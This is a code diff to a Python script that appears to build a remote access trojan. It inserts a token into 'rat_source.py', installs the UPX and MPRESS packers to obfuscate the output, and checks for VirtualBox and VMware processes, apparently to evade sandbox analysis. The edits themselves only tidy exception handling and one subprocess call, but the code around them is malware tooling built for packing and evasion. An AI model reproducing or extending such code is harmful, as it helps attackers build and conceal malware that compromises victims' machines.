@@ -600,7 +600,7 @@ def insert_token(token):
             with open("rat_source.py", "a", encoding="utf-8", errors="ignore") as f:
                 f.write(f"\n\n# Emergency token insertion\ntoken = '{token}'\n")
             return True
-        except:
+        except Exception as e:
             return False
 
 def install_packers():
@@ -614,7 +614,7 @@ def install_packers():
             print(f"{Fore.GREEN}[+] UPX is already installed{Style.RESET_ALL}")
         else:
             raise Exception("UPX not available")
-    except:
+    except Exception as e:
         print(f"{Fore.YELLOW}[!] UPX not found, installing...{Style.RESET_ALL}")
         try:
             if os.name == 'nt':
@@ -660,10 +660,10 @@ def install_packers():
                 print(f"{Fore.CYAN}[*] Attempting to install UPX using system package manager{Style.RESET_ALL}")
                 try:
                     subprocess.run(["sudo", "apt-get", "install", "-y", "upx-ucl"], check=False)
-                except:
+                except Exception as e:
                     try:
                         subprocess.run(["sudo", "apt-get", "install", "-y", "upx"], check=False)
-                    except:
+                    except Exception as e:
                         print(f"{Fore.RED}[!] Failed to install UPX using package manager{Style.RESET_ALL}")
             
             try:
@@ -685,7 +685,7 @@ def install_packers():
             print(f"{Fore.GREEN}[+] MPRESS is already installed{Style.RESET_ALL}")
         else:
             raise Exception("MPRESS not available")
-    except:
+    except Exception as e:
         print(f"{Fore.YELLOW}[!] MPRESS not found, installing...{Style.RESET_ALL}")
         try:
             if os.name == 'nt':
@@ -1238,7 +1238,7 @@ def check_vm():
     try:
         # Check common VM processes
         suspicious_processes = ["vboxservice.exe", "vmtoolsd.exe", "vboxtray.exe", "vmwaretray.exe"]
-        output = subprocess.check_output("tasklist", shell=True).decode().lower()
+        output = subprocess.check_output(["tasklist"], shell=False).decode().lower()
         for proc in suspicious_processes:
             if proc in output:
                 return True
